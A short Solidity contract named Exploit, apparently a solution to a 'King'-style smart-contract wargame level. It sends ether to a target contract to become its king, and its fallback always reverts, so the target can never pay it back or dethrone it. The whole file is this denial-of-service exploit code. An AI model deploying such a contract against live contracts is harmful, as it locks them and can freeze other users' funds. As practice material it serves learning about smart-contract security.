// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Exploit {
    address payable KingAddress;

    constructor(address _KingAddress) payable {
        KingAddress = payable(_KingAddress);
    }

    function send() public payable {
        (bool result,) = KingAddress.call{value: 0.0011 ether}("");
        require(result, "Transaction Failed");
    }

    fallback() external {
        revert();
    }
}
